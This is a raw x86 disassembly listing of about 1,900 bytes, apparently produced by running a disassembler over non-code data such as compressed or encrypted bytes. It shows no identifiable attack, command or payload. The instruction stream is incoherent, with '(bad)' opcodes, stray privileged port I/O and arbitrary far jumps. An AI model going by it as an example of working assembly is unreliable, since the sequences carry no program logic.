  41a833:	imul   ebp,ecx,0xbf850246
  41a839:	shl    DWORD PTR [ebp-0x76e27d3c],1
  41a83f:	pop    esi
  41a840:	imul   edx,DWORD PTR [edi+0x512c1cf3],0x403093c5
  41a84a:	stos   BYTE PTR es:[edi],al
  41a84b:	sub    al,0x4a
  41a84d:	mov    eax,0xe8496c5b
  41a852:	cli    
  41a853:	lea    ecx,[eax+0x2ad03295]
  41a859:	fiadd  DWORD PTR [ebx]
  41a85b:	inc    eax
  41a85c:	mov    fs,WORD PTR [ecx+0x622cdb72]
  41a862:	fwait
  41a863:	lahf   
  41a864:	pop    esi
  41a865:	xchg   DWORD PTR [eax-0x19],esi
  41a868:	mov    ah,0xc2
  41a86a:	pop    ss
  41a86b:	data16 mov cl,0x3
  41a86e:	into   
  41a86f:	fsub   QWORD PTR [edx-0xd144940]
  41a875:	ror    BYTE PTR [eax+edi*1+0x5a],1
  41a879:	fdivp  st(3),st
  41a87b:	in     al,0x6e
  41a87d:	inc    ebp
  41a87e:	adc    al,0x3e
  41a880:	xor    ah,BYTE PTR [eax-0x32]
  41a883:	dec    eax
  41a884:	pushf  
  41a885:	cli    
  41a886:	jge    0x41a89b
  41a888:	in     eax,dx
  41a889:	lods   eax,DWORD PTR ds:[esi]
  41a88a:	adc    edi,DWORD PTR [ecx]
  41a88c:	dec    ebp
  41a88d:	xor    DWORD PTR [edi],esi
  41a88f:	mov    ebx,0x325de930
  41a894:	ds mov ah,0x53
  41a897:	sbb    eax,0x76446f73
  41a89c:	pop    ebx
  41a89d:	in     al,dx
  41a89e:	sub    al,0xef
  41a8a0:	fdiv   QWORD PTR [eax+edi*1+0x52]
  41a8a4:	les    eax,FWORD PTR [ecx+edx*4+0x68]
  41a8a8:	or     eax,0xaa2c8c1d
  41a8ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8ae:	lahf   
  41a8af:	or     eax,0x7a1a9d4b
  41a8b4:	pop    esi
  41a8b5:	sub    eax,DWORD PTR [ebx]
  41a8b7:	push   ds
  41a8b8:	add    ecx,DWORD PTR [ebp-0x6f663060]
  41a8be:	imul   edi,DWORD PTR [edi+0x6c937e53],0x8
  41a8c5:	xor    ch,dl
  41a8c7:	mov    ecx,0x11647295
  41a8cc:	ja     0x41a8a3
  41a8ce:	aaa    
  41a8cf:	pop    esp
  41a8d0:	(bad)  
  41a8d1:	lock ret 0xdd89
  41a8d5:	cmp    edi,DWORD PTR [edx-0x74]
  41a8d8:	jb     0x41a8a9
  41a8da:	inc    edi
  41a8db:	push   ecx
  41a8dc:	adc    ch,BYTE PTR ds:0x2bd54537
  41a8e2:	(bad)  [ebx+0x3e]
  41a8e5:	daa    
  41a8e6:	aam    0x31
  41a8e8:	inc    ebx
  41a8e9:	mov    bl,0x7d
  41a8eb:	push   ebp
  41a8ec:	fsubr  DWORD PTR [edi]
  41a8ee:	scas   eax,DWORD PTR es:[edi]
  41a8ef:	mov    dh,0xd3
  41a8f1:	rol    BYTE PTR [esi-0x417ca46a],1
  41a8f7:	nop
  41a8f8:	in     al,dx
  41a8f9:	push   ecx
  41a8fa:	pop    edx
  41a8fb:	fld    DWORD PTR [edx+0x9]
  41a8fe:	adc    bh,cl
  41a900:	or     esi,DWORD PTR [eax+ebx*4+0x7]
  41a904:	iret   
  41a905:	mov    ds:0x6b934c4d,eax
  41a90a:	fdivr  QWORD PTR [eax+0x353a2833]
  41a910:	in     al,0x4e
  41a912:	fidivr WORD PTR ds:0x3cc7d876
  41a918:	je     0x41a8e5
  41a91a:	out    dx,al
  41a91b:	sbb    dl,bh
  41a91d:	aam    0x1b
  41a91f:	enter  0xff50,0x37
  41a923:	test   al,0x78
  41a925:	das    
  41a926:	xor    DWORD PTR [esi],ebx
  41a928:	imul   ebx,DWORD PTR [esi],0x70a62626
  41a92e:	mov    cl,0x31
  41a930:	and    eax,eax
  41a932:	in     al,0x20
  41a934:	imul   ecx,DWORD PTR [esi+ecx*2],0x6bd114ab
  41a93b:	pop    ebp
  41a93c:	push   esi
  41a93d:	xor    eax,0xfd1a5037
  41a942:	cwde   
  41a943:	nop
  41a944:	in     al,dx
  41a945:	mov    ah,0xd
  41a947:	fnstsw WORD PTR [ecx-0x70df10f9]
  41a94d:	cmp    si,WORD PTR [ebp-0x5f]
  41a951:	fdivr  QWORD PTR [esi]
  41a953:	fbstp  TBYTE PTR [ebx+0x629f1792]
  41a959:	adc    al,0x1d
  41a95b:	mov    ebx,0x57174e13
  41a960:	fisttp DWORD PTR [ecx+0x2e9a097f]
  41a966:	or     DWORD PTR [edx+0x2bfb9d1a],eax
  41a96c:	loop   0x41a9de
  41a96e:	jecxz  0x41a9ee
  41a970:	push   ecx
  41a971:	xor    ebx,DWORD PTR [ebx-0x4bfb7fc8]
  41a977:	(bad)  
  41a978:	iret   
  41a979:	bound  eax,QWORD PTR [ebx-0x362434f7]
  41a97f:	ret    0xef72
  41a982:	data16 xchg BYTE PTR [ecx],bl
  41a985:	inc    edx
  41a986:	cmc    
  41a987:	repnz rcl DWORD PTR [ecx],1
  41a98a:	sbb    DWORD PTR [ecx+ebx*2],ebx
  41a98d:	aas    
  41a98e:	push   ecx
  41a98f:	ins    BYTE PTR es:[edi],dx
  41a990:	push   ss
  41a991:	enter  0xde18,0xed
  41a995:	cmp    ah,BYTE PTR [edx-0x71572780]
  41a99b:	popf   
  41a99c:	mov    ecx,0xd856eae5
  41a9a1:	cdq    
  41a9a2:	(bad)  
  41a9a3:	repnz fcmovnu st,st(2)
  41a9a6:	(bad)  
  41a9a7:	cmp    BYTE PTR [edi],ah
  41a9a9:	fidiv  WORD PTR [edi-0xe]
  41a9ac:	fwait
  41a9ad:	xchg   ecx,eax
  41a9ae:	sub    cl,BYTE PTR [eax+esi*8-0x7b2fc6b9]
  41a9b5:	add    dh,BYTE PTR [esi-0x26f217cb]
  41a9bb:	test   ah,0xe1
  41a9be:	in     al,0x60
  41a9c0:	and    esi,DWORD PTR [ecx+0x5c395bbd]
  41a9c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9c7:	sbb    dh,bl
  41a9c9:	rcl    BYTE PTR [edx+0x5e],1
  41a9cc:	and    BYTE PTR [edi+0x22],al
  41a9cf:	adc    eax,0x538ee384
  41a9d4:	sar    DWORD PTR [ebx+0x6e73e30f],0x40
  41a9db:	fwait
  41a9dc:	mov    ds:0x39db2807,al
  41a9e1:	(bad)
  41a9e4:	push   esp
  41a9e5:	push   ds
  41a9e6:	mov    esp,0xbb2f4538
  41a9eb:	inc    esp
  41a9ec:	mov    WORD PTR [ecx],ds
  41a9ee:	mov    dl,0x26
  41a9f0:	mov    al,0x9c
  41a9f2:	in     al,dx
  41a9f3:	add    BYTE PTR [esi-0x38eae8b9],al
  41a9f9:	sub    BYTE PTR [eax],bh
  41a9fb:	cmc    
  41a9fc:	and    bh,dl
  41a9fe:	sbb    edx,DWORD PTR [esp+eax*8-0x3f]
  41aa02:	loop   0x41aa1e
  41aa04:	rcl    BYTE PTR [edx-0x7],cl
  41aa07:	fld    DWORD PTR [ecx-0x68b51586]
  41aa0d:	sbb    al,0x10
  41aa0f:	jmp    0x41aa22
  41aa11:	ds aad 0x3e
  41aa14:	add    eax,0x192742ab
  41aa19:	mov    ebx,0xf5a29465
  41aa1e:	cmp    al,0xa9
  41aa20:	jg     0x41a9a9
  41aa22:	stos   DWORD PTR es:[edi],eax
  41aa23:	in     al,0xa5
  41aa25:	test   DWORD PTR [ebx],ecx
  41aa27:	sbb    BYTE PTR [ebx+edi*4+0x16],bl
  41aa2b:	jnp    0x41a9d7
  41aa2d:	jmp    0x41aa0f
  41aa2f:	ret    
  41aa30:	mov    DWORD PTR [edi+0x7b7fb689],esp
  41aa36:	inc    ebp
  41aa37:	das    
  41aa38:	xchg   esp,eax
  41aa39:	sbb    ah,BYTE PTR [edx-0x78]
  41aa3c:	cmp    bl,bh
  41aa3e:	imul   esp,esi,0x2b3f65ff
  41aa44:	lods   eax,DWORD PTR ds:[esi]
  41aa45:	fnstenv [ecx+0x399d12da]
  41aa4b:	xchg   ebx,eax
  41aa4c:	repnz addr16 inc ebx
  41aa4f:	cmp    esi,DWORD PTR [esi]
  41aa51:	mov    cl,0xcb
  41aa53:	fmul   QWORD PTR ds:0x881465d3
  41aa59:	outs   dx,BYTE PTR ds:[esi]
  41aa5a:	xchg   BYTE PTR [ecx],bl
  41aa5c:	pop    ebp
  41aa5d:	(bad)  
  41aa5e:	jbe    0x41aa04
  41aa60:	scas   eax,DWORD PTR es:[edi]
  41aa61:	jge    0x41aac7
  41aa63:	ins    BYTE PTR es:[edi],dx
  41aa64:	xchg   esp,eax
  41aa65:	popf   
  41aa66:	xchg   ebx,eax
  41aa67:	aas    
  41aa68:	rcl    DWORD PTR [edx+0x76a1ac8d],1
  41aa6e:	sbb    al,BYTE PTR [ebx]
  41aa70:	(bad)  
  41aa71:	es mov al,ah
  41aa74:	jecxz  0x41aa74
  41aa76:	adc    BYTE PTR [ebx-0x78a98902],ah
  41aa7c:	mov    ds:0x3e23032b,eax
  41aa81:	mov    bl,0xe1
  41aa83:	xchg   esp,eax
  41aa84:	xor    eax,0xb57f7da0
  41aa89:	into   
  41aa8a:	clc    
  41aa8b:	dec    edi
  41aa8c:	bound  esp,QWORD PTR [esi-0x4]
  41aa8f:	in     eax,0x9f
  41aa91:	test   DWORD PTR [ebx+0x1b5a0365],esp
  41aa97:	iret   
  41aa98:	xchg   edx,eax
  41aa99:	jge    0x41aacd
  41aa9b:	int    0x9f
  41aa9d:	sub    eax,0xe04d6cd9
  41aaa2:	test   BYTE PTR [ecx],ah
  41aaa4:	cmp    esi,edx
  41aaa6:	sub    BYTE PTR [edx-0x22],ah
  41aaa9:	sub    BYTE PTR [ecx-0x780712c9],ah
  41aaaf:	xchg   esi,eax
  41aab0:	iret   
  41aab1:	enter  0xe09d,0x38
  41aab5:	shl    DWORD PTR [ecx+0x6f18f617],1
  41aabb:	and    esp,DWORD PTR [eax]
  41aabd:	or     edx,DWORD PTR [ecx]
  41aabf:	pop    ss
  41aac0:	inc    ebp
  41aac1:	mov    ds:0x35f2e4ec,al
  41aac6:	adc    eax,0xf5ab6958
  41aacb:	push   ecx
  41aacc:	sbb    eax,DWORD PTR [edx-0x43]
  41aacf:	jge    0x41ab17
  41aad1:	adc    BYTE PTR [esi],bh
  41aad3:	scas   eax,DWORD PTR es:[edi]
  41aad4:	sahf   
  41aad5:	pop    eax
  41aad6:	inc    esp
  41aad7:	or     esi,DWORD PTR [esi-0x4ec419f2]
  41aadd:	mov    eax,ds:0x24bbcc99
  41aae2:	out    0x5b,eax
  41aae4:	add    cl,BYTE PTR [ecx]
  41aae6:	inc    ecx
  41aae7:	ret    
  41aae8:	xchg   DWORD PTR [ebp+esi*8-0x25636ed7],edi
  41aaef:	cmp    al,0x9e
  41aaf1:	or     al,0xd5
  41aaf3:	outs   dx,BYTE PTR ds:[esi]
  41aaf4:	lea    edi,[eax-0x40]
  41aaf7:	xchg   ecx,eax
  41aaf8:	and    eax,DWORD PTR ds:0x1513747
  41aafe:	cmp    al,0x40
  41ab00:	add    eax,0xca36ddb2
  41ab05:	js     0x41aaa6
  41ab07:	outs   dx,BYTE PTR ds:[esi]
  41ab08:	sbb    ebx,eax
  41ab0a:	jecxz  0x41ab27
  41ab0c:	mov    ds:0x3bb4a98,al
  41ab11:	mov    WORD PTR [ecx+0x68],es
  41ab14:	sar    DWORD PTR [edx-0x1c79ac66],0x99
  41ab1b:	jnp    0x41aaef
  41ab1d:	pop    ebx
  41ab1e:	shl    bl,cl
  41ab20:	pop    ebp
  41ab21:	cwde   
  41ab22:	mov    edx,0x20b2abba
  41ab27:	sar    DWORD PTR [edx+0x53],0x77
  41ab2b:	adc    edx,DWORD PTR ds:0xe7e07d57
  41ab31:	mov    dh,0xec
  41ab33:	(bad)  [ebp-0x1a70d9ee]
  41ab39:	and    al,0xfd
  41ab3b:	xchg   ebx,eax
  41ab3c:	jae    0x41ab64
  41ab3e:	mov    ebp,0x8833099c
  41ab43:	pop    ds
  41ab44:	inc    edx
  41ab45:	sahf   
  41ab46:	add    DWORD PTR [edi-0x35],edx
  41ab49:	int    0x7a
  41ab4b:	sbb    eax,0x9bbba7ec
  41ab50:	cmp    esi,DWORD PTR ds:0xf85c33e6
  41ab56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab57:	jle    0x41ab11
  41ab59:	push   ebx
  41ab5a:	jl     0x41ab56
  41ab5c:	stos   DWORD PTR es:[edi],eax
  41ab5d:	fnstsw WORD PTR [ecx-0x4d76237b]
  41ab63:	pop    ss
  41ab64:	adc    DWORD PTR [ebx],0xffffffaf
  41ab67:	das    
  41ab68:	stos   BYTE PTR es:[edi],al
  41ab69:	icebp  
  41ab6a:	mov    dh,0x2a
  41ab6c:	test   BYTE PTR [esi+0x63f90341],bl
  41ab72:	or     BYTE PTR [eax-0x5e],ch
  41ab75:	jne    0x41abf5
  41ab77:	sub    ecx,DWORD PTR [esi]
  41ab79:	imul   ecx,DWORD PTR [esi+0x4d],0x407c2572
  41ab80:	sti    
  41ab81:	jp     0x41ab37
  41ab83:	add    eax,0xcfbdb35c
  41ab88:	sbb    al,0xf2
  41ab8a:	pop    esp
  41ab8b:	pop    edx
  41ab8c:	lds    edx,FWORD PTR [ebx]
  41ab8e:	stos   DWORD PTR es:[edi],eax
  41ab8f:	test   esi,edx
  41ab91:	add    DWORD PTR [edx-0x39],0x3ab0725a
  41ab98:	sub    ebx,esp
  41ab9a:	sbb    bl,dl
  41ab9c:	jp     0x41abe1
  41ab9e:	add    ecx,ecx
  41aba0:	cdq    
  41aba1:	jmp    0x48af:0xe1112c4a
  41aba8:	mov    ebp,0xd27bcb3c
  41abad:	loope  0x41ab3a
  41abaf:	push   edi
  41abb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abb1:	gs ss mov dh,0xb8
  41abb5:	jo     0x41ab81
  41abb7:	sbb    eax,DWORD PTR [ebx-0x7d1b03dd]
  41abbd:	popf   
  41abbe:	mov    bl,0xda
  41abc0:	mov    eax,0xc6913ec3
  41abc5:	inc    edx
  41abc6:	pop    ebp
  41abc7:	or     eax,0x15feae55
  41abcc:	push   esp
  41abcd:	push   ss
  41abce:	mov    al,ds:0xa632df45
  41abd3:	fst    DWORD PTR [esi-0x7f49988d]
  41abd9:	imul   ebp,DWORD PTR [eax],0xcb9d3caf
  41abdf:	and    ecx,DWORD PTR [edx]
  41abe1:	cmp    dl,bh
  41abe3:	mov    DWORD PTR [edx+0x2f43ec79],ecx
  41abe9:	pop    es
  41abea:	or     ecx,0xffffff88
  41abed:	in     eax,0xb7
  41abef:	cli    
  41abf0:	add    bh,al
  41abf2:	bnd js 0x41ac10
  41abf5:	sbb    ebp,eax
  41abf7:	test   DWORD PTR [ebx-0x2b1752e0],ecx
  41abfd:	sbb    DWORD PTR [esi+ebp*8],esi
  41ac00:	push   edi
  41ac01:	mov    dh,0xc8
  41ac03:	popa   
  41ac04:	call   ecx
  41ac06:	sub    DWORD PTR [bx+di+0x22ca],esi
  41ac0b:	cmp    BYTE PTR [ebx],0x9
  41ac0e:	(bad)  
  41ac0f:	push   esp
  41ac10:	pop    esi
  41ac11:	(bad)  
  41ac12:	xor    eax,0xb3f294a1
  41ac17:	pop    es
  41ac18:	sub    ebp,DWORD PTR [ebp-0x3f]
  41ac1b:	xchg   esp,eax
  41ac1c:	push   ss
  41ac1d:	cmp    bl,BYTE PTR [edi]
  41ac1f:	inc    edi
  41ac20:	xchg   edx,eax
  41ac21:	jg     0x41ac25
  41ac23:	xor    ah,ch
  41ac25:	frstor [ebp-0x6e]
  41ac28:	push   ebx
  41ac29:	(bad)  
  41ac2a:	into   
  41ac2b:	jl     0x41ac45
  41ac2d:	fidiv  DWORD PTR [ecx+0xe]
  41ac30:	(bad)  
  41ac32:	cmp    edx,DWORD PTR [edx+0x45]
  41ac35:	retf   0x1d34
  41ac38:	jb     0x41abd1
  41ac3a:	jo     0x41ac67
  41ac3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac3d:	mov    al,0x6f
  41ac3f:	push   edi
  41ac40:	pop    esi
  41ac41:	mov    eax,ds:0x78fdc9f9
  41ac46:	mov    al,ds:0x139c5bfb
  41ac4b:	adc    esi,edx
  41ac4d:	add    al,0x3b
  41ac4f:	(bad)  
  41ac50:	xchg   ecx,eax
  41ac51:	stos   DWORD PTR es:[edi],eax
  41ac52:	xchg   edx,eax
  41ac53:	inc    esp
  41ac54:	addr16 push edx
  41ac56:	sti    
  41ac57:	adc    esp,edx
  41ac59:	rcl    BYTE PTR [eax+0x3b],cl
  41ac5c:	push   ss
  41ac5d:	and    ebp,DWORD PTR [ebx-0x31ea1278]
  41ac63:	xchg   ecx,eax
  41ac64:	push   ebx
  41ac65:	xchg   esi,eax
  41ac66:	iret   
  41ac67:	in     eax,0x63
  41ac69:	push   ebx
  41ac6a:	cmp    eax,0x4c85a13f
  41ac6f:	or     ecx,esi
  41ac71:	xor    DWORD PTR [edx+0x73fc9900],ecx
  41ac77:	jmp    0x7bcd9707
  41ac7c:	test   BYTE PTR [edx-0x2a],bl
  41ac7f:	sbb    edi,DWORD PTR [ebx-0x74]
  41ac82:	push   0x475ab646
  41ac87:	into   
  41ac88:	cs mov cl,0x49
  41ac8b:	mov    ah,0xe4
  41ac8d:	int3   
  41ac8e:	fdivr  DWORD PTR [edx+esi*1]
  41ac91:	and    edx,edx
  41ac93:	mov    ch,0x9b
  41ac95:	scas   al,BYTE PTR es:[edi]
  41ac96:	xor    ch,BYTE PTR [ecx-0x60]
  41ac99:	inc    edi
  41ac9a:	mov    eax,ds:0xb1a63aff
  41ac9f:	aas    
  41aca0:	(bad)  
  41aca1:	into   
  41aca2:	fs fwait
  41aca4:	mov    BYTE PTR [eax+0x65],dl
  41aca7:	icebp  
  41aca8:	fldcw  WORD PTR [esi]
  41acaa:	push   edi
  41acab:	mov    ebp,esp
  41acad:	xor    DWORD PTR [ebp+0x78],edi
  41acb0:	mov    ebp,0x411ae346
  41acb5:	xor    BYTE PTR [ecx+eiz*8],al
  41acb8:	enter  0xe567,0x63
  41acbc:	sub    DWORD PTR [ecx-0x5ef722fa],esp
  41acc2:	cld    
  41acc3:	cmp    ebp,0x445164ec
  41acc9:	pop    ds
  41acca:	push   es
  41accb:	scas   eax,DWORD PTR es:[edi]
  41accc:	outs   dx,BYTE PTR ds:[esi]
  41accd:	jge    0x41ad14
  41accf:	add    eax,0xa8763e5c
  41acd4:	jl     0x41ace0
  41acd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acd7:	out    dx,al
  41acd8:	xchg   DWORD PTR [eax+0x79],ebp
  41acdb:	cli    
  41acdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acdd:	pop    edx
  41acde:	call   0x9b9c:0x56f8d76b
  41ace5:	aas    
  41ace6:	fcmovne st,st(1)
  41ace8:	cdq    
  41ace9:	sbb    cl,BYTE PTR [eax]
  41aceb:	popf   
  41acec:	imul   esp,DWORD PTR [edx-0x75db905d],0x8570c3ac
  41acf6:	fidivr WORD PTR [ebx-0x6b]
  41acf9:	sub    eax,0x468883dc
  41acfe:	mov    esi,0x5a6baa29
  41ad03:	jo     0x41ad01
  41ad05:	ja     0x41acfa
  41ad07:	pop    edi
  41ad08:	stos   DWORD PTR es:[edi],eax
  41ad09:	cmp    eax,0x34e43a42
  41ad0e:	aad    0xb4
  41ad10:	mov    ebp,0x5a707066
  41ad15:	int3   
  41ad16:	ficomp DWORD PTR [eax]
  41ad18:	shl    DWORD PTR [esp+esi*4+0x62],0x43
  41ad1d:	push   ecx
  41ad1e:	fld    DWORD PTR [eax-0x67fd7aac]
  41ad24:	mov    ch,dh
  41ad26:	rcr    edx,0x76
  41ad29:	(bad)  
  41ad2b:	pop    edi
  41ad2c:	js     0x41ace8
  41ad2e:	fistp  DWORD PTR [edi+0x69]
  41ad31:	jge    0x41ad41
  41ad33:	je     0x41ad75
  41ad35:	addr16 push ecx
  41ad37:	xchg   esi,eax
  41ad38:	sar    BYTE PTR [eax+edi*4-0x6f],1
  41ad3c:	or     al,0x83
  41ad3e:	inc    esi
  41ad3f:	daa    
  41ad40:	(bad)  
  41ad42:	xchg   ebp,eax
  41ad43:	mov    ecx,cs
  41ad45:	xor    esp,edx
  41ad47:	test   eax,0x18d851f
  41ad4c:	aad    0xc0
  41ad4e:	popf   
  41ad4f:	mov    al,0xf4
  41ad51:	repz fidiv WORD PTR [edi-0x15]
  41ad56:	mov    fs,WORD PTR cs:[ecx-0x67]
  41ad5a:	pop    eax
  41ad5b:	imul   ebx,DWORD PTR [edi],0xffffff85
  41ad5e:	mov    ss,WORD PTR [edx-0x46]
  41ad61:	cmp    ebx,DWORD PTR [ebx+0x3c623274]
  41ad67:	icebp  
  41ad68:	mov    bh,0x98
  41ad6a:	cdq    
  41ad6b:	mov    ebx,0x88921f39
  41ad70:	fild   QWORD PTR [esp+edi*8-0x3e7d2a43]
  41ad77:	(bad)  
  41ad79:	sbb    BYTE PTR [esi],0xa5
  41ad7c:	adc    eax,0x34d7bcf4
  41ad81:	xor    al,0x6b
  41ad83:	inc    ecx
  41ad84:	sti    
  41ad85:	loope  0x41adec
  41ad87:	test   al,0x65
  41ad89:	cli    
  41ad8a:	fld    QWORD PTR [eax+edx*2-0x47]
  41ad8e:	pop    ebp
  41ad8f:	cmp    al,0x51
  41ad91:	in     eax,dx
  41ad92:	pop    esp
  41ad93:	cld    
  41ad94:	jmp    0x117b:0xbc18faf2
  41ad9b:	push   esp
  41ad9c:	pop    es
  41ad9d:	xor    eax,0xdabd6ad6
  41ada2:	cmc    
  41ada3:	dec    esi
  41ada4:	jno    0x41ad4a
  41ada6:	dec    esi
  41ada7:	in     eax,dx
  41ada8:	cmp    eax,0x79c995f2
  41adad:	mov    ds:0x984af8c3,eax
  41adb2:	cdq    
  41adb3:	hlt    
  41adb4:	retf   0x2ea9
  41adb7:	push   es
  41adb8:	stos   DWORD PTR es:[edi],eax
  41adb9:	rcl    BYTE PTR [ecx+0x178b9738],cl
  41adbf:	aad    0x2e
  41adc1:	xor    DWORD PTR ds:0x6451c0e3,ecx
  41adc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adc8:	ss cmc 
  41adca:	adc    al,0x3b
  41adcc:	outs   dx,BYTE PTR ds:[esi]
  41adcd:	xor    al,0x3c
  41adcf:	push   esi
  41add0:	mov    edi,0x6e1f125e
  41add5:	cmp    BYTE PTR [edi+esi*8+0x18],ch
  41add9:	mov    DWORD PTR [eax],edx
  41addb:	bound  ebp,QWORD PTR [esi+0x5c]
  41adde:	jne    0x41ae2e
  41ade0:	pop    ecx
  41ade1:	mov    bl,0xf6
  41ade3:	cmp    BYTE PTR [ecx+ecx*8],0x17
  41ade7:	xchg   edi,eax
  41ade8:	sbb    BYTE PTR [edx+0x74],dh
  41adeb:	iret   
  41adec:	pop    esi
  41aded:	int3   
  41adee:	in     eax,0x45
  41adf0:	fcom   QWORD PTR [ebp-0x78]
  41adf3:	mov    al,dl
  41adf5:	sbb    BYTE PTR [ecx-0xaad9f65],ah
  41adfb:	and    BYTE PTR [esi-0x5f],cl
  41adfe:	jae    0x41ae21
  41ae00:	add    edx,DWORD PTR [ebp+edi*1+0x152dbf8e]
  41ae07:	push   ss
  41ae08:	mov    eax,ds:0xd1252b66
  41ae0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae0e:	xor    DWORD PTR [esp+eax*2+0x41636e],edi
  41ae15:	outs   dx,DWORD PTR ds:[esi]
  41ae16:	fst    QWORD PTR ds:0xc1bc9f55
  41ae1c:	pop    ebp
  41ae1d:	mov    edi,0x9e83dea6
  41ae22:	outs   dx,BYTE PTR ds:[esi]
  41ae23:	sub    eax,0x72522598
  41ae28:	mov    ebp,0x80e1d966
  41ae2d:	loope  0x41ae2a
  41ae2f:	jp     0x41ae6d
  41ae31:	in     al,0x21
  41ae33:	xor    esi,DWORD PTR [ebp+0x47]
  41ae36:	and    al,0x87
  41ae38:	xor    al,0x20
  41ae3a:	add    DWORD PTR ds:0x6b45254d,eax
  41ae40:	or     BYTE PTR [ecx+0x4c1445ec],cl
  41ae46:	mov    eax,DWORD PTR [esi-0x17]
  41ae49:	cwde   
  41ae4a:	test   BYTE PTR [edi-0x38],ah
  41ae4d:	cmp    ebp,DWORD PTR [ecx-0x6d]
  41ae50:	ds shr ch,1
  41ae53:	cmp    al,0xe8
  41ae55:	loope  0x41ae48
  41ae57:	xchg   esi,eax
  41ae58:	add    ebx,esp
  41ae5a:	mov    edi,0xb6645daf
  41ae5f:	int    0x7e
  41ae61:	jge    0x41aeb1
  41ae63:	mov    ch,0xd2
  41ae65:	fst    DWORD PTR [esi+edx*2+0x32]
  41ae69:	or     al,0x1f
  41ae6b:	in     al,dx
  41ae6c:	adc    BYTE PTR [ebx*1-0x24a17356],dh
  41ae73:	jmp    0x41ae91
  41ae75:	cs xchg edx,eax
  41ae77:	jge    0x41ae33
  41ae79:	stc    
  41ae7a:	dec    edx
  41ae7b:	push   ecx
  41ae7c:	jnp    0x41ae3c
  41ae7e:	and    ecx,DWORD PTR [edx-0x39]
  41ae81:	shl    dl,1
  41ae83:	loopne 0x41ae39
  41ae85:	fiadd  WORD PTR [edi-0x44]
  41ae88:	clc    
  41ae89:	popf   
  41ae8a:	(bad)  
  41ae8b:	sahf   
  41ae8c:	jns    0x41aebf
  41ae8e:	in     eax,dx
  41ae8f:	ret    
  41ae90:	jbe    0x41ae31
  41ae92:	dec    ecx
  41ae93:	iret   
  41ae94:	addr16 lock mov esp,0x87015708
  41ae9b:	pushf  
  41ae9c:	push   cs
  41ae9d:	add    eax,0x6425505e
  41aea2:	add    ebp,DWORD PTR ds:0x3f7c5de7
  41aea8:	xor    bl,BYTE PTR [ebx+edx*2]
  41aeab:	lds    ebx,FWORD PTR [eax]
  41aead:	add    al,0x43
  41aeaf:	fild   WORD PTR [esi]
  41aeb1:	or     esp,DWORD PTR [esi-0x21180062]
  41aeb7:	adc    eax,0xbc995f73
  41aebc:	popf   
  41aebd:	xor    BYTE PTR [esi-0x80],ch
  41aec0:	jo     0x41aeea
  41aec2:	ss lahf 
  41aec4:	sbb    DWORD PTR [edi+0x35],ecx
  41aec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aec8:	pop    ss
  41aec9:	jb     0x41ae6b
  41aecb:	xchg   esi,eax
  41aecc:	adc    edi,ebp
  41aece:	enter  0xf1a9,0x7e
  41aed2:	sub    esi,esi
  41aed4:	pop    esp
  41aed5:	call   FWORD PTR [ebx+ebp*2+0x5c3a2556]
  41aedc:	or     al,BYTE PTR [esi-0x71]
  41aedf:	or     ch,BYTE PTR ds:0xcf5f6ede
  41aee5:	dec    edx
  41aee6:	loop   0x41af45
  41aee8:	pop    ebp
  41aee9:	je     0x41af0e
  41aeeb:	(bad)  
  41aeed:	mov    ch,ah
  41aeef:	push   ebp
  41aef0:	adc    al,0xb0
  41aef2:	fldenv [esp+ebp*8]
  41aef5:	das    
  41aef6:	nop
  41aef7:	bound  esi,QWORD PTR ds:0x838c0ebc
  41aefd:	push   esi
  41aefe:	retf   0x49d8
  41af01:	mov    esp,es
  41af03:	sbb    al,0x80
  41af05:	ins    DWORD PTR es:[edi],dx
  41af06:	push   0xffffffe4
  41af08:	cdq    
  41af09:	and    dh,BYTE PTR [eax]
  41af0b:	in     al,dx
  41af0c:	dec    esp
  41af0d:	mov    ecx,0x2437c997
  41af12:	cdq    
  41af13:	repnz pop edx
  41af15:	or     cl,BYTE PTR [esi*4-0x27d21d15]
  41af1c:	fwait
  41af1d:	cmovno edx,DWORD PTR [ebp+eax*2+0x2b]
  41af22:	mov    ecx,DWORD PTR [eax]
  41af24:	inc    esp
  41af25:	and    eax,0x7f82ef02
  41af2a:	xor    ah,BYTE PTR [ebx+0x2b9f7c08]
  41af30:	mov    eax,0x94296b17
  41af35:	sbb    BYTE PTR cs:[esi+0x4d],dl
  41af39:	inc    edi
  41af3a:	push   ecx
  41af3b:	adc    al,0x37
  41af3d:	pop    edi
  41af3e:	sbb    ah,dl
  41af40:	popf   
  41af41:	cdq    
  41af42:	add    BYTE PTR [esi],cl
  41af44:	cmp    eax,edi
  41af46:	sub    al,0xbf
  41af48:	sti    
  41af49:	xor    al,BYTE PTR [esi+0x7d]
  41af4c:	dec    ebp
  41af4d:	jno    0x41af52
  41af4f:	mov    edi,DWORD PTR [edi]
  41af51:	ins    DWORD PTR es:[edi],dx
  41af52:	shl    bl,0x39
  41af55:	sahf   
  41af56:	or     eax,0x2731fdce
  41af5b:	sbb    eax,0xd169cf86
  41af60:	retf   
  41af61:	mov    bl,0xec
  41af63:	gs out dx,eax
  41af65:	out    dx,al
  41af66:	inc    eax
  41af67:	sbb    DWORD PTR [esi],ebx
  41af69:	mov    cl,0x2d
  41af6b:	pop    ebp
  41af6c:	imul   eax,DWORD PTR [edi-0x2c],0xffffff9a
  41af70:	sbb    eax,0x6d515e78
  41af75:	mov    al,0x85
  41af77:	xor    al,0x1f
  41af79:	in     al,0x82
  41af7b:	lds    ecx,FWORD PTR [edx]
  41af7d:	bound  eax,QWORD PTR [eax+esi*2-0xc9f0567]
  41af84:	gs es loop 0x41af39
  41af88:	test   esp,ebx
  41af8a:	loope  0x41af2b
  41af8c:	cmp    al,BYTE PTR [esi-0x2089147b]
  41af92:	push   edx
  41af93:	xlat   BYTE PTR ds:[ebx]
  41af94:	adc    eax,0xa2970e50
  41af99:	ficomp DWORD PTR [edi]
  41af9b:	add    esp,DWORD PTR [edx+edx*4-0x55]
